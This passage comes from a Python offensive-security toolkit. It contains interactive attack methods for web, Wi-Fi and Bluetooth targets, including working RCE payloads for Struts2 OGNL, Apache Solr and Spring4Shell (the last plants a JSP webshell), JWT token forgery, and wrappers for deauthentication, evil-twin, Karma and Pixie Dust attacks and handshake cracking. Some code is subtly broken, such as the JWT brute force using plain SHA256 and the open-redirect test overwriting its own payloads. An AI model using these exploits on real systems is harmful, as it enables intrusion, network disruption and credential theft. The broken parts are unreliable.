                        if 'Applications' in auth_response.text:
                            print(f"[+] Valid credentials found: {username}/{password}")
                            print("You can now upload WAR files for RCE")
                            return
                    except:
                        pass
                
                print("[-] No default credentials worked")
            else:
                print("[-] Tomcat Manager not found or not accessible")
        except Exception as e:
            print(f"Error: {e}")

    def hidden_params(self):
        url = input("Enter target URL with parameters (e.g. http://example.com/page?param=value): ")
        wordlist = input("Enter path to parameter wordlist (or press enter for default): ")
        
        if not wordlist:
            wordlist = "param_words.txt"
            default_params = ['debug', 'test', 'admin', 'api', 'rest', 'json', 'callback', 'id', 'user', 'auth']
            with open(wordlist, 'w') as f:
                f.write("\n".join(default_params))
        
        try:
            with open(wordlist, 'r') as f:
                params = f.read().splitlines()
            
            print(f"Testing for hidden parameters on {url}...")
            
            base_url = url.split('?')[0] if '?' in url else url
            original_params = {}
            
            if '?' in url:
                query = url.split('?')[1]
                for pair in query.split('&'):
                    if '=' in pair:
                        key, value = pair.split('=', 1)
                        original_params[key] = value
            
            for param in params:
                test_params = original_params.copy()
                test_params[param] = 'test'
                
                query_string = '&'.join([f"{k}={v}" for k, v in test_params.items()])
                test_url = f"{base_url}?{query_string}"
                
                try:
                    original_response = requests.get(url, timeout=5)
                    test_response = requests.get(test_url, timeout=5)
                    
                    if test_response.status_code != original_response.status_code:
                        print(f"[+] Parameter {param} affects response (status code changed)")
                    elif len(test_response.text) != len(original_response.text):
                        print(f"[+] Parameter {param} affects response (content length changed)")
                    elif test_response.text != original_response.text:
                        print(f"[+] Parameter {param} affects response (content changed)")
                except Exception as e:
                    print(f"Error testing parameter {param}: {e}")
        except Exception as e:
            print(f"Error: {e}")

    def js_secrets(self):
        url = input("Enter target URL: ")
        try:
            response = requests.get(url, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            scripts = soup.find_all('script', src=True)
            
            print("Found JavaScript files:")
            for script in scripts:
                print(script['src'])
            
            print("\nScanning for secrets in JavaScript files...")
            
            def scan_js(js_url):
                try:
                    if not js_url.startswith('http'):
                        if js_url.startswith('//'):
                            js_url = 'https:' + js_url
                        elif js_url.startswith('/'):
                            js_url = url + js_url
                        else:
                            js_url = url + '/' + js_url
                    
                    js_response = requests.get(js_url, timeout=5)
                    js_content = js_response.text
                    
                    patterns = {
                        'AWS Key': r'AKIA[0-9A-Z]{16}',
                        'Google API Key': r'AIza[0-9A-Za-z\\-_]{35}',
                        'Facebook Access Token': r'EAACEdEose0cBA[0-9A-Za-z]+',
                        'Twitter Bearer Token': r'Bearer [A-Za-z0-9%-_]{60,}',
                        'Password in JS': r'pass(word)?[=:]["\' ][^"\'\n]+'
                    }
                    
                    found = False
                    for name, pattern in patterns.items():
                        matches = re.findall(pattern, js_content)
                        if matches:
                            found = True
                            print(f"\n[+] Found {name} in {js_url}")
                            for match in matches[:3]:
                                print(f"  {match}")
                    
                    if not found:
                        print(f"[-] No obvious secrets found in {js_url}")
                
                except Exception as e:
                    print(f"Error scanning {js_url}: {e}")
            
            with ThreadPoolExecutor(max_workers=5) as executor:
                executor.map(scan_js, [script['src'] for script in scripts])
        except Exception as e:
            print(f"Error: {e}")

    def github_leak(self):
        keyword = input("Enter keyword/domain to search for: ")
        try:
            print(f"Searching GitHub for potential leaks containing {keyword}...")
            search_url = f"https://api.github.com/search/code?q={keyword}"
            response = requests.get(search_url, timeout=10)
            
            if response.status_code == 200:
                results = response.json()
                print(f"Found {results['total_count']} potential leaks")
                
                for item in results['items'][:10]:
                    print(f"\nRepository: {item['repository']['full_name']}")
                    print(f"File: {item['name']}")
                    print(f"URL: {item['html_url']}")
            else:
                print("[-] Error searching GitHub")
        except Exception as e:
            print(f"Error: {e}")

    def backup_detector(self):
        url = input("Enter target URL: ")
        backup_extensions = ['.bak', '.zip', '.tar.gz', '.tgz', '.rar', '.7z', '.old', '.backup']
        backup_files = ['wp-config.php~', 'config.php.bak', '.env.bak', 'database.sql.bak']
        
        print("Checking for exposed backup files...")
        
        for ext in backup_extensions:
            test_url = url + ext
            try:
                response = requests.get(test_url, timeout=5)
                if response.status_code == 200:
                    print(f"[+] Found backup file at {test_url}")
                    print(f"Size: {len(response.content)} bytes")
            except Exception as e:
                print(f"Error checking {test_url}: {e}")
        
        for file in backup_files:
            test_url = url + '/' + file
            try:
                response = requests.get(test_url, timeout=5)
                if response.status_code == 200:
                    print(f"[+] Found backup file at {test_url}")
                    print(f"Size: {len(response.content)} bytes")
            except Exception as e:
                print(f"Error checking {test_url}: {e}")

    def csp_analyzer(self):
        url = input("Enter target URL: ")
        try:
            response = requests.get(url, timeout=5)
            csp_header = response.headers.get('Content-Security-Policy', '')
            
            if csp_header:
                print("[+] Content Security Policy found:")
                print(csp_header)
                
                if "'unsafe-inline'" in csp_header:
                    print("[!] Inline scripts allowed (unsafe-inline)")
                if "'unsafe-eval'" in csp_header:
                    print("[!] eval() allowed (unsafe-eval)")
                if "'strict-dynamic'" in csp_header:
                    print("[!] strict-dynamic present - may bypass CSP")
            else:
                print("[-] No Content Security Policy header found")
        except Exception as e:
            print(f"Error: {e}")

    def email_spoofing(self):
        domain = input("Enter domain to check for email spoofing: ")
        try:
            print(f"Checking SPF/DMARC records for {domain}...")
            
            spf_records = dns.resolver.resolve(domain, 'TXT')
            spf_found = False
            dmarc_found = False
            
            for rdata in spf_records:
                if 'v=spf1' in str(rdata):
                    spf_found = True
                    print(f"[+] SPF record found: {rdata}")
            
            try:
                dmarc_records = dns.resolver.resolve(f'_dmarc.{domain}', 'TXT')
                for rdata in dmarc_records:
                    if 'v=DMARC1' in str(rdata):
                        dmarc_found = True
                        print(f"[+] DMARC record found: {rdata}")
            except:
                pass
            
            if not spf_found:
                print("[-] No SPF record found - vulnerable to email spoofing")
            if not dmarc_found:
                print("[-] No DMARC record found - vulnerable to email spoofing")
        except Exception as e:
            print(f"Error: {e}")

    def open_db_finder(self):
        ip = input("Enter target IP or range (e.g. 192.168.1.1 or 192.168.1.1/24): ")
        db_ports = {
            'MongoDB': 27017,
            'Redis': 6379,
            'Elasticsearch': 9200,
            'Memcached': 11211,
            'MySQL': 3306,
            'PostgreSQL': 5432
        }
        
        print(f"Scanning {ip} for open databases...")
        
        nm = nmap.PortScanner()
        nm.scan(hosts=ip, ports=','.join(str(p) for p in db_ports.values()), arguments='-sS -T4')
        
        for host in nm.all_hosts():
            print(f"\nHost: {host}")
            for proto in nm[host].all_protocols():
                ports = nm[host][proto].keys()
                for port in ports:
                    for db_name, db_port in db_ports.items():
                        if port == db_port:
                            print(f"[+] Found open {db_name} on port {port}")

    def ga_tracker(self):
        url = input("Enter target URL: ")
        try:
            response = requests.get(url, timeout=5)
            ga_matches = re.findall(r'UA-\d+-\d+', response.text)
            
            if ga_matches:
                print("[+] Google Analytics trackers found:")
                for tracker in set(ga_matches):
                    print(tracker)
            else:
                print("[-] No Google Analytics trackers found")
        except Exception as e:
            print(f"Error: {e}")

    def login_brute_detect(self):
        url = input("Enter target URL: ")
        common_paths = [
            '/login',
            '/admin',
            '/wp-login.php',
            '/administrator',
            '/signin',
            '/auth',
            '/account/login'
        ]
        
        print("Checking for login pages...")
        
        for path in common_paths:
            try:
                test_url = url + path
                response = requests.get(test_url, timeout=5)
                
                if response.status_code == 200 and any(x in response.text.lower() for x in ['login', 'password', 'username', 'sign in']):
                    print(f"[+] Found login page at {test_url}")
            except Exception as e:
                print(f"Error checking {path}: {e}")

    def jwt_none_test(self):
        url = input("Enter target URL with JWT token: ")
        try:
            response = requests.get(url, timeout=5)
            cookies = response.cookies
            
            jwt_token = None
            for cookie in cookies:
                if len(cookie.value.split('.')) == 3:
                    jwt_token = cookie.value
                    break
            
            if jwt_token:
                print(f"[+] Found JWT token: {jwt_token}")
                
                header, payload, signature = jwt_token.split('.')
                decoded_header = json.loads(base64.b64decode(header + '==').decode())
                
                if decoded_header.get('alg') == 'none':
                    print("[+] Vulnerable to JWT 'none' algorithm attack")
                    
                    modified_header = base64.b64encode(json.dumps({"alg":"none"}).encode()).decode().replace('=', '')
                    modified_payload = base64.b64encode(json.dumps({"user":"admin"}).encode()).decode().replace('=', '')
                    modified_token = f"{modified_header}.{modified_payload}."
                    
                    print(f"\nModified token: {modified_token}")
                    print("Try using this token to bypass authentication")
                else:
                    print("[-] JWT token does not use 'none' algorithm")
            else:
                print("[-] No JWT token found in cookies")
        except Exception as e:
            print(f"Error: {e}")

    def username_enum(self):
        username = input("Enter username to check: ")
        sites = {
            'GitHub': f'https://github.com/{username}',
            'Twitter': f'https://twitter.com/{username}',
            'Instagram': f'https://instagram.com/{username}',
            'Reddit': f'https://reddit.com/user/{username}',
            'YouTube': f'https://youtube.com/{username}'
        }
        
        print(f"Checking username {username} across platforms...")
        
        for site, url in sites.items():
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    print(f"[+] Found on {site}: {url}")
                else:
                    print(f"[-] Not found on {site}")
            except Exception as e:
                print(f"Error checking {site}: {e}")

    def linkedin_enum(self):
        company = input("Enter company name: ")
        print(f"Searching LinkedIn for {company} employees...")
        try:
            search_url = f"https://www.google.com/search?q=site:linkedin.com/in+{company}"
            headers = {'User-Agent': 'Mozilla/5.0'}
            response = requests.get(search_url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                results = soup.find_all('div', class_='g')
                
                print(f"\nFound {len(results)} potential employees:")
                for result in results[:10]:
                    link = result.find('a')['href']
                    name = result.find('h3').text
                    print(f"{name} - {link}")
            else:
                print("[-] Error searching LinkedIn profiles")
        except Exception as e:
            print(f"Error: {e}")

    def metadata_scraper(self):
        file_path = input("Enter path to PDF/DOC file: ")
        try:
            if file_path.endswith('.pdf'):
                print("Extracting PDF metadata...")
                result = subprocess.run(['pdfinfo', file_path], capture_output=True, text=True)
                print(result.stdout)
            elif file_path.endswith(('.doc', '.docx')):
                print("Extracting DOC metadata...")
                result = subprocess.run(['antiword', '-x', 'db', file_path], capture_output=True, text=True)
                print(result.stdout)
            else:
                print("Unsupported file type")
        except Exception as e:
            print(f"Error: {e}. Make sure pdfinfo/antiword are installed.")

    def email_pattern_gen(self):
        domain = input("Enter company domain (e.g. example.com): ")
        names = input("Enter employee names (comma separated): ").split(',')
        
        print("\nGenerating email patterns...")
        
        patterns = [
            '{f}.{last}@{domain}',
            '{first}.{last}@{domain}',
            '{f}{last}@{domain}',
            '{first}{last}@{domain}',
            '{first}@{domain}',
            '{last}@{domain}',
            '{first}.{l}@{domain}',
            '{f}{l}@{domain}'
        ]
        
        for name in names:
            name = name.strip()
            parts = name.split()
            if len(parts) >= 2:
                first, last = parts[0], parts[-1]
                f, l = first[0], last[0]
                
                print(f"\nPossible emails for {name}:")
                for pattern in patterns:
                    email = pattern.format(
                        first=first.lower(),
                        last=last.lower(),
                        f=f.lower(),
                        l=l.lower(),
                        domain=domain
                    )
                    print(email)

    def email_permutation_gen(self):
        base_email = input("Enter base email (e.g. john.doe@example.com): ")
        
        print("\nGenerating email permutations...")
        
        name, domain = base_email.split('@')
        parts = name.split('.')
        
        if len(parts) >= 2:
            first, last = parts[0], parts[1]
            f, l = first[0], last[0]
            
            permutations = [
                f"{first}.{last}@{domain}",
                f"{f}.{last}@{domain}",
                f"{first}{last}@{domain}",
                f"{f}{last}@{domain}",
                f"{first}.{l}@{domain}",
                f"{first}_{last}@{domain}",
                f"{first}-{last}@{domain}",
                f"{last}.{first}@{domain}",
                f"{l}.{first}@{domain}",
                f"{last}{first}@{domain}",
                f"{l}{first}@{domain}",
                f"{first}@{domain}",
                f"{last}@{domain}"
            ]
            
            for email in permutations:
                print(email)
        else:
            print("Could not parse name parts from email")

    def ssid_sniffer(self):
        print("Scanning for nearby Wi-Fi networks...")
        try:
            result = subprocess.run(['iwlist', 'scan'], capture_output=True, text=True)
            print(result.stdout)
        except Exception as e:
            print(f"Error: {e}. Make sure iwlist is installed and you have proper permissions.")

    def bssid_tracker(self):
        print("Tracking BSSIDs and signal strength...")
        try:
            result = subprocess.run(['airodump-ng', 'wlan0'], capture_output=True, text=True)
            print(result.stdout)
        except Exception as e:
            print(f"Error: {e}. Make sure aircrack-ng is installed and you have proper permissions.")

    def wifi_channel_analyzer(self):
        print("Analyzing Wi-Fi channels...")
        try:
            result = subprocess.run(['iw', 'dev', 'wlan0', 'scan'], capture_output=True, text=True)
            print(result.stdout)
        except Exception as e:
            print(f"Error: {e}. Make sure iw is installed and you have proper permissions.")

    def probe_sniffer(self):
        print("Sniffing Wi-Fi probe requests...")
        try:
            result = subprocess.run(['tcpdump', '-i', 'wlan0', '-e', '-s', '256', 'type mgt subtype probe-req'], capture_output=True, text=True)
            print(result.stdout)
        except Exception as e:
            print(f"Error: {e}. Make sure tcpdump is installed and you have proper permissions.")

    def client_ap_mapper(self):
        print("Mapping clients to APs...")
        try:
            result = subprocess.run(['airodump-ng', '--output-format', 'csv', 'wlan0'], capture_output=True, text=True)
            print(result.stdout)
        except Exception as e:
            print(f"Error: {e}. Make sure aircrack-ng is installed and you have proper permissions.")

    def eap_detector(self):
        print("Detecting EAP (WPA2-Enterprise) networks...")
        try:
            result = subprocess.run(['airodump-ng', 'wlan0'], capture_output=True, text=True)
            lines = result.stdout.split('\n')
            for line in lines:
                if 'EAP' in line:
                    print(line)
        except Exception as e:
            print(f"Error: {e}. Make sure aircrack-ng is installed and you have proper permissions.")

    def wps_finder(self):
        print("Finding WPS-enabled networks...")
        try:
            result = subprocess.run(['wash', '-i', 'wlan0'], capture_output=True, text=True)
            print(result.stdout)
        except Exception as e:
            print(f"Error: {e}. Make sure reaver is installed and you have proper permissions.")

    def beacon_flood_detect(self):
        print("Detecting beacon flood attacks...")
        try:
            result = subprocess.run(['airodump-ng', 'wlan0'], capture_output=True, text=True)
            lines = result.stdout.split('\n')
            ssid_counts = {}
            for line in lines:
                if 'SSID' in line:
                    ssid = line.split('SSID:')[1].strip()
                    ssid_counts[ssid] = ssid_counts.get(ssid, 0) + 1
            
            for ssid, count in ssid_counts.items():
                if count > 5:
                    print(f"[+] Possible beacon flood: {ssid} ({count} beacons)")
        except Exception as e:
            print(f"Error: {e}. Make sure aircrack-ng is installed and you have proper permissions.")

    def pmkid_dumper(self):
        print("Dumping PMKID hashes...")
        try:
            bssid = input("Enter target BSSID: ")
            channel = input("Enter channel: ")
            output = input("Enter output file name: ")
            
            subprocess.run(['hcxdumptool', '-i', 'wlan0', '--enable_status=1', '-o', output, '--filterlist=targets', '--filtermode=2', '--bssid=' + bssid, '--channel=' + channel])
            print(f"[+] PMKID hashes dumped to {output}")
        except Exception as e:
            print(f"Error: {e}. Make sure hcxdumptool is installed and you have proper permissions.")

    def wpa_handshake(self):
        print("Capturing WPA handshake...")
        try:
            bssid = input("Enter target BSSID: ")
            channel = input("Enter channel: ")
            output = input("Enter output file name: ")
            
            subprocess.run(['airodump-ng', '-c', channel, '--bssid', bssid, '-w', output, 'wlan0'])
            print(f"[+] WPA handshake capture started. Look for 'WPA handshake' message.")
        except Exception as e:
            print(f"Error: {e}. Make sure aircrack-ng is installed and you have proper permissions.")

    def hidden_ssid_revealer(self):
        print("Attempting to reveal hidden SSIDs...")
        try:
            result = subprocess.run(['airodump-ng', 'wlan0'], capture_output=True, text=True)
            lines = result.stdout.split('\n')
            for line in lines:
                if 'length: 0' in line:
                    print(f"[+] Found hidden SSID: {line.split()[0]}")
        except Exception as e:
            print(f"Error: {e}. Make sure aircrack-ng is installed and you have proper permissions.")

    def wifi_vendor_fingerprint(self):
        print("Fingerprinting Wi-Fi vendors...")
        try:
            result = subprocess.run(['airodump-ng', 'wlan0'], capture_output=True, text=True)
            lines = result.stdout.split('\n')
            for line in lines:
                if 'BSSID' not in line and line.strip():
                    bssid = line.split()[0]
                    oui = bssid.replace(':', '')[:6].upper()
                    print(f"BSSID: {bssid} - OUI: {oui}")
        except Exception as e:
            print(f"Error: {e}. Make sure aircrack-ng is installed and you have proper permissions.")

    def rssi_heatmap(self):
        print("Generating RSSI heatmap...")
        try:
            bssid = input("Enter target BSSID: ")
            duration = input("Enter duration in seconds: ")
            
            print(f"Measuring RSSI for {bssid} over {duration} seconds...")
            for i in range(int(duration)):
                result = subprocess.run(['iwconfig', 'wlan0'], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'Signal level' in line:
                        rssi = line.split('Signal level=')[1].split()[0]
                        print(f"Time: {i}s - RSSI: {rssi}")
                time.sleep(1)
        except Exception as e:
            print(f"Error: {e}")

    def deauth_attack(self):
        print("Launching deauthentication attack...")
        try:
            bssid = input("Enter target BSSID: ")
            client = input("Enter client MAC (or 'ff:ff:ff:ff:ff:ff' for broadcast): ")
            count = input("Enter number of deauth packets: ")
            
            subprocess.run(['aireplay-ng', '--deauth', count, '-a', bssid, '-c', client, 'wlan0'])
            print("[+] Deauthentication packets sent")
        except Exception as e:
            print(f"Error: {e}. Make sure aircrack-ng is installed and you have proper permissions.")

    def evil_twin(self):
        print("Setting up evil twin access point...")
        try:
            ssid = input("Enter SSID to mimic: ")
            interface = input("Enter wireless interface: ")
            
            print(f"[+] Creating evil twin for {ssid}")
            subprocess.run(['airbase-ng', '-e', ssid, '-c', '6', interface])
        except Exception as e:
            print(f"Error: {e}. Make sure aircrack-ng is installed and you have proper permissions.")

    def karma_attack(self):
        print("Starting Karma attack...")
        try:
            interface = input("Enter wireless interface: ")
            
            print("[+] Responding to all probe requests")
            subprocess.run(['airbase-ng', '-P', '-C', '30', '-e', 'FreeWiFi', interface])
        except Exception as e:
            print(f"Error: {e}. Make sure aircrack-ng is installed and you have proper permissions.")

    def pixie_dust(self):
        print("Launching WPS Pixie Dust attack...")
        try:
            bssid = input("Enter target BSSID: ")
            channel = input("Enter channel: ")
            
            subprocess.run(['reaver', '-i', 'wlan0', '-b', bssid, '-c', channel, '-K', '1'])
        except Exception as e:
            print(f"Error: {e}. Make sure reaver is installed and you have proper permissions.")

    def handshake_cracker(self):
        print("Cracking WPA handshake...")
        try:
            handshake_file = input("Enter path to handshake file (.cap): ")
            wordlist = input("Enter path to wordlist: ")
            
            subprocess.run(['aircrack-ng', '-w', wordlist, handshake_file])
        except Exception as e:
            print(f"Error: {e}. Make sure aircrack-ng is installed.")

    def captive_portal(self):
        print("Setting up captive portal...")
        try:
            interface = input("Enter wireless interface: ")
            ssid = input("Enter SSID for portal: ")
            
            print(f"[+] Creating captive portal for {ssid}")
            subprocess.run(['hostapd', '-B', '/etc/hostapd/hostapd.conf'])
            subprocess.run(['dnsmasq', '-C', '/etc/dnsmasq.conf'])
            subprocess.run(['python3', '-m', 'http.server', '80'])
        except Exception as e:
            print(f"Error: {e}. Make sure hostapd and dnsmasq are installed.")

    def ssid_flood(self):
        print("Flooding with fake SSIDs...")
        try:
            count = input("Enter number of fake SSIDs: ")
            interface = input("Enter wireless interface: ")
            
            print(f"[+] Broadcasting {count} fake SSIDs")
            for i in range(int(count)):
                ssid = f"FakeNetwork_{random.randint(1000,9999)}"
                subprocess.Popen(['iwconfig', interface, 'essid', ssid, 'mode', 'adhoc'])
        except Exception as e:
            print(f"Error: {e}")

    def eapol_replay(self):
        print("Replaying EAPOL packets...")
        try:
            pcap_file = input("Enter path to EAPOL packet capture: ")
            
            subprocess.run(['aireplay-ng', '--test', '-r', pcap_file, 'wlan0'])
        except Exception as e:
            print(f"Error: {e}. Make sure aircrack-ng is installed.")

    def mana_attack(self):
        print("Starting MANA attack...")
        try:
            interface = input("Enter wireless interface: ")
            
            subprocess.run(['python3', 'mana/setup.py', '--interface', interface])
        except Exception as e:
            print(f"Error: {e}. Make sure MANA toolkit is installed.")

    def wpa2_mitm(self):
        print("Setting up WPA2 Enterprise MITM...")
        try:
            interface = input("Enter wireless interface: ")
            ssid = input("Enter target SSID: ")
            
            print(f"[+] Creating rogue AP for {ssid}")
            subprocess.run(['hostapd-wpe', '-c', '/etc/hostapd-wpe/hostapd-wpe.conf'])
        except Exception as e:
            print(f"Error: {e}. Make sure hostapd-wpe is installed.")

    def hashcat_pmkid(self):
        print("Running Hashcat on PMKID hash...")
        try:
            hash_file = input("Enter path to PMKID hash file: ")
            wordlist = input("Enter path to wordlist: ")
            
            subprocess.run(['hashcat', '-m', '16800', hash_file, wordlist])
        except Exception as e:
            print(f"Error: {e}. Make sure hashcat is installed.")

    def bt_enum(self):
        print("Enumerating Bluetooth devices...")
        try:
            subprocess.run(['hcitool', 'scan'], timeout=10)
        except Exception as e:
            print(f"Error: {e}. Make sure bluez is installed.")

    def ble_sniffer(self):
        print("Sniffing BLE advertisements...")
        try:
            subprocess.run(['hcitool', 'lescan'], timeout=10)
        except Exception as e:
            print(f"Error: {e}. Make sure bluez is installed.")

    def ble_service_dump(self):
        print("Dumping BLE services...")
        try:
            bdaddr = input("Enter target Bluetooth address: ")
            subprocess.run(['gatttool', '-b', bdaddr, '--primary'])
        except Exception as e:
            print(f"Error: {e}. Make sure bluez is installed.")

    def bt_vendor_lookup(self):
        print("Looking up Bluetooth vendors...")
        try:
            bdaddr = input("Enter Bluetooth MAC address: ")
            oui = bdaddr.replace(':', '')[:6].upper()
            print(f"OUI: {oui}")
        except Exception as e:
            print(f"Error: {e}")

    def bt_pairing_sniffer(self):
        print("Sniffing Bluetooth pairing...")
        try:
            subprocess.run(['btmon'])
        except Exception as e:
            print(f"Error: {e}. Make sure bluez is installed.")

    def ble_spoof_detect(self):
        print("Detecting BLE spoofing...")
        try:
            bdaddr = input("Enter Bluetooth MAC address: ")
            name = input("Enter advertised device name: ")
            
            oui = bdaddr.replace(':', '')[:6].upper()
            print(f"Checking OUI {oui} against device name {name}...")
        except Exception as e:
            print(f"Error: {e}")

    def struts2_injection(self):
        url = input("Enter target URL: ")
        payloads = [
            r"${#_memberAccess['allowStaticMethodAccess']=true,@java.lang.Runtime@getRuntime().exec('id')}",
            r"${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        ]
        
        print("Testing for Struts2 OGNL injection...")
        
        for payload in payloads:
            try:
                headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                response = requests.post(url, data={'test': payload}, headers=headers, timeout=10)
                
                if 'uid=' in response.text or 'gid=' in response.text:
                    print("[+] Vulnerable to Struts2 OGNL injection")
                    print("Command output:")
                    print(response.text[:500] + "...")
                    return
            except Exception as e:
                print(f"Error testing payload: {e}")
        
        print("[-] No Struts2 OGNL injection detected")

    def laravel_debug_check(self):
        url = input("Enter target URL: ")
        try:
            response = requests.get(url, timeout=5)
            
            if 'APP_DEBUG=true' in response.text or 'Whoops, looks like something went wrong' in response.text:
                print("[+] Laravel debug mode enabled")
                
                if '.env' in response.text:
                    print("[+] .env file exposed - check for credentials")
            else:
                print("[-] Laravel debug mode not enabled or not detected")
        except Exception as e:
            print(f"Error: {e}")

    def solr_rce(self):
        url = input("Enter target Apache Solr URL: ")
        try:
            response = requests.get(url + '/solr/admin/cores?wt=json', timeout=5)
            if response.status_code == 200:
                cores = response.json().get('status', {}).keys()
                print(f"Found Solr cores: {', '.join(cores)}")
                
                for core in cores:
                    print(f"\nTesting core {core} for RCE...")
                    payload = {
                        'update-queryresponsewriter': {
                            'startup': 'lazy',
                            'name': 'velocity',
                            'class': 'solr.VelocityResponseWriter',
                            'template.base.dir': '',
                            'solr.resource.loader.enabled': 'true',
                            'params.resource.loader.enabled': 'true'
                        }
                    }
                    
                    rce_test = requests.post(
                        f"{url}/solr/{core}/config",
                        json=payload,
                        headers={'Content-Type': 'application/json'},
                        timeout=10
                    )
                    
                    if rce_test.status_code == 200:
                        cmd = 'whoami'
                        exploit_url = f"{url}/solr/{core}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{cmd}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
                        
                        exploit_response = requests.get(exploit_url, timeout=10)
                        if exploit_response.status_code == 200 and 'java.lang.Runtime' not in exploit_response.text:
                            print("[+] Vulnerable to Apache Solr RCE (CVE-2019-17558)")
                            print(f"Command output for '{cmd}':")
                            print(exploit_response.text)
                            return
            else:
                print("[-] Could not access Solr admin interface")
        except Exception as e:
            print(f"Error: {e}")

    def spring4shell(self):
        url = input("Enter target Spring application URL: ")
        headers = {
            'prefix': 'header',
            'suffix': 'Runtime.getRuntime().exec("id");',
            'c': 'Runtime',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        data = 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='
        
        print("Testing for Spring4Shell (CVE-2022-22965)...")
        
        try:
            response = requests.post(url, headers=headers, data=data, timeout=10)
            
            if response.status_code == 200:
                exploit_url = f"{url}/tomcatwar.jsp?cmd=id"
                exploit_response = requests.get(exploit_url, timeout=10)
                
                if 'uid=' in exploit_response.text:
                    print("[+] Vulnerable to Spring4Shell")
                    print("Command output:")
                    print(exploit_response.text)
                else:
                    print("[-] Exploit attempt failed - target may not be vulnerable")
            else:
                print("[-] Target does not appear vulnerable")
        except Exception as e:
            print(f"Error: {e}")

    def host_header_injection(self):
        url = input("Enter target URL: ")
        headers = {
            'Host': 'evil.com',
            'X-Forwarded-Host': 'evil.com'
        }
        
        print("Testing for Host header injection...")
        
        try:
            response = requests.get(url, headers=headers, timeout=5)
            
            if 'evil.com' in response.text:
                print("[+] Host header injection possible")
                print("Check for cache poisoning or password reset poisoning")
            else:
                print("[-] No obvious Host header injection")
        except Exception as e:
            print(f"Error: {e}")

    def open_redirect(self):
        url = input("Enter target URL with parameter to test: ")
        param = input("Enter parameter name: ")
        test_url = "https://google.com"
        
        print("Testing for open redirect...")
        
        try:
            test_params = {
                param: test_url,
                param: '//google.com',
                param: '/\\google.com',
                param: 'http://google.com',
                param: 'https:google.com'
            }
            
            for payload, value in test_params.items():
                test_url = f"{url}?{payload}={value}"
                response = requests.get(test_url, allow_redirects=False, timeout=5)
                
                if response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    if 'google.com' in location:
                        print(f"[+] Open redirect found via {payload}")
                        print(f"Redirects to: {location}")
                        return
            
            print("[-] No open redirect vulnerabilities found")
        except Exception as e:
            print(f"Error: {e}")

    def crlf_injection(self):
        url = input("Enter target URL: ")
        params = {
            'test': 'test%0d%0aSet-Cookie:injected=true',
            'q': 'test%0d%0aHeader:injected'
        }
        
        print("Testing for CRLF injection...")
        
        try:
            for param, payload in params.items():
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=5)
                
                if 'injected=true' in response.headers.get('Set-Cookie', '') or 'Header:injected' in response.text:
                    print("[+] CRLF injection possible")
                    print(f"Payload: {payload}")
                    return
            
            print("[-] No CRLF injection vulnerabilities found")
        except Exception as e:
            print(f"Error: {e}")

    def ssti_detection(self):
        url = input("Enter target URL with parameter to test: ")
        param = input("Enter parameter name: ")
        
        payloads = {
            'Jinja2': '{{7*7}}',
            'Twig': '{{7*7}}',
            'Velocity': '#set($x=7*7)${x}',
            'Freemarker': '<#assign x=7*7>${x}'
        }
        
        print("Testing for SSTI vulnerabilities...")
        
        try:
            for engine, payload in payloads.items():
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=5)
                
                if '49' in response.text:
                    print(f"[+] Possible {engine} SSTI vulnerability")
                    print(f"Payload: {payload}")
                    return
            
            print("[-] No SSTI vulnerabilities found")
        except Exception as e:
            print(f"Error: {e}")

    def jwt_brute(self):
        jwt = input("Enter JWT token: ")
        wordlist = input("Enter path to wordlist: ")
        
        print("Brute-forcing JWT secret...")
        
        try:
            with open(wordlist, 'r') as f:
                secrets = f.read().splitlines()
            
            header, payload, signature = jwt.split('.')
            data = f"{header}.{payload}"
            
            for secret in secrets:
                try:
                    computed_sig = base64.urlsafe_b64encode(
                        hashlib.sha256(f"{data}.{secret}".encode()).digest()
                    ).decode().replace('=', '')
                    
                    if computed_sig == signature:
                        print(f"[+] Found JWT secret: {secret}")
                        return
                except:
                    continue
            
            print("[-] JWT secret not found in wordlist")
        except Exception as e:
            print(f"Error: {e}")

    def rfi_lfi_test(self):
        url = input("Enter target URL with parameter to test: ")
